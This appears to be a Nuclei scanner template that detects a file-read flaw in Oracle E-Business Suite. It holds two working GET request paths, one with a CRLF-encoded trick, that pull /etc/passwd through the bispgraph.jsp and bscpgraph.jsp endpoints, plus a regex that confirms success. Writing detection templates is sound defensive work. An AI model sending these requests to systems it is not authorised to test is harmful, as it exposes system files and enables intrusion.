id: oracle-ebs-bispgrapgh-file-read

info:
  name: Oracle eBusiness Suite - Improper File Access
  author: emenalf,tirtha_mandal,thomas_from_offensity
  severity: critical
  description: |
    Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.
  reference:
    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
  metadata:
    max-request: 2
  tags: oracle,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/"
      - "{{BaseURL}}/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd"

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
# digest: 4b0a0048304602210099d8c34f21f0f6e545df83f6723ce201335fc7edcadc0ddabddc2dce9bb05faa022100df56f995070dd9a7fbc26f2b413dab8f89236e734f961c70e68d432e5bc16bf5:922c64590222798bb761d5b6d8e72950